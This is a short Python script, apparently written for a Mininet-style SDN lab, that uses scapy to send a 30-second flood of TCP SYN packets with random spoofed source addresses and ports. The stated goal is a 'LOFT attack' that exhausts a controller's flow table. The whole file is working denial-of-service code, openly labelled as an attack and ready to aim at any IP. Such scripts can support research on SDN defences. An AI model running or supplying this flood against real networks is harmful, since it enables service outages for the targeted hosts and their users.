from scapy.all import *
import random
import time

def generate_loft_attack(target_ip, duration=30, iface="h1-eth0"):
    """
    LOFT Attack: Send massive unique flows to overwhelm flow table
    Each packet has random src_ip and src_port = unique flow
    """
    print(f"[*] Starting LOFT Attack on {target_ip} for {duration} seconds...")
    print(f"[*] Sending unique flows to exhaust controller flow table...")
    
    start = time.time()
    count = 0

    while time.time() - start < duration:
        # Random source IP = new unique flow every packet
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        dst_port = random.randint(1, 1024)

        pkt = IP(src=src_ip, dst=target_ip) / TCP(
            sport=src_port,
            dport=dst_port,
            flags="S"  # SYN flag
        )

        send(pkt, iface=iface, verbose=False)
        count += 1

        if count % 100 == 0:
            print(f"[*] Sent {count} attack packets...")

    print(f"[+] Attack complete! Sent {count} packets in {duration} seconds.")

if __name__ == "__main__":
    # h2 attacks h1
    generate_loft_attack(
        target_ip="10.0.1.1",
        duration=30,
        iface="h2-eth0"
    )
